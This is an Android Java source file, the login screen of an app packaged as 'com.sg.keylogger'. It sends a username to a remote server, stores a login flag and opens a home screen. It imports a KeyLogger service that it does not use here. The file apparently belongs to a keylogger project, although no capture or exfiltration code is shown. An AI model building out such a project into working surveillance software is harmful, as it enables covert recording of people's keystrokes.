package com.sg.keylogger.view;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;

import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.afollestad.materialdialogs.DialogAction;
import com.afollestad.materialdialogs.MaterialDialog;
import com.google.android.material.textfield.TextInputEditText;
import com.google.gson.JsonObject;
import com.sg.keylogger.R;
import com.sg.keylogger.services.KeyLogger;
import com.sg.keylogger.services.network.CallService;
import com.sg.keylogger.services.network.RetrofitInstance;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {
    TextInputEditText editText;
    Button button;
    String input;
    ProgressBar progressBar;
    SharedPreferences pref;
    SharedPreferences.Editor editor;
    int PRIVATE_MODE = 0;
    public static final String PREFER_NAME = "MHC";
    public static final String IS_USER_LOGIN = "IsUserLoggedIn";
    public static final String KEY_NAME = "username";
    LinearLayout linearLayout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        pref=getSharedPreferences(PREFER_NAME,PRIVATE_MODE);
        if(pref.contains(IS_USER_LOGIN)){
            boolean t=pref.getBoolean(IS_USER_LOGIN,false);
            if(t){
                String username=pref.getString(KEY_NAME,"");
                Intent i=new Intent(MainActivity.this,HomeActivity.class);
                i.putExtra("username",username);
                startActivity(i);
                MainActivity.this.finish();
            }
        }
        setContentView(R.layout.activity_main);
        editText=findViewById(R.id.editText);
        button=findViewById(R.id.button);
        progressBar=findViewById(R.id.progressBarHome);
        linearLayout=findViewById(R.id.relativeLayout);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setIndeterminate(true);
                    input = editText.getText().toString();
                    if(input.length()==0){
                        Toast.makeText(MainActivity.this,"Invalid Username",Toast.LENGTH_SHORT).show();
                        progressBar.setIndeterminate(false);
                        progressBar.setVisibility(View.GONE);
                    }
                    else{
                        JsonObject jsonObject = new JsonObject();
                        try {
                            jsonObject.addProperty("username", input);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        CallService callService=RetrofitInstance.getService();
                        Call<ResponseBody> call=callService.userPost(jsonObject);
                        Log.d("Res",jsonObject.toString());
                        call.enqueue(new Callback<ResponseBody>() {
                            @Override
                            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                                if(response.code()==200){
                                    progressBar.setIndeterminate(false);
                                    progressBar.setVisibility(View.GONE);
                                    Intent i=new Intent(MainActivity.this,HomeActivity.class);
                                    i.putExtra("username",input);
                                    pref = MainActivity.this.getSharedPreferences(PREFER_NAME, PRIVATE_MODE);
                                    editor = pref.edit();
                                    editor.putString(KEY_NAME,input);
                                    editor.putBoolean(IS_USER_LOGIN,true);
                                    editor.commit();
                                    startActivity(i);
                                    MainActivity.this.finish();
                                }
                                else if(response.code()==409){
                                    Toast.makeText(MainActivity.this,"User already exists",Toast.LENGTH_SHORT).show();
                                    progressBar.setIndeterminate(false);
                                    progressBar.setVisibility(View.GONE);
                                }
                                else{
                                    Toast.makeText(MainActivity.this,"An error occurred. Please try again later.",Toast.LENGTH_SHORT).show();
                                    progressBar.setIndeterminate(false);
                                    progressBar.setVisibility(View.GONE);
                                }
                            }

                            @Override
                            public void onFailure(Call<ResponseBody> call, Throwable t) {
                                Log.d("Response",t.getMessage());
                                Toast.makeText(MainActivity.this,"An error occurred. Please try again later.",Toast.LENGTH_SHORT).show();
                                progressBar.setIndeterminate(false);
                                progressBar.setVisibility(View.GONE);
                            }
                        });
                    }

                }
                catch (Exception e){}
            }
        });

    }
}
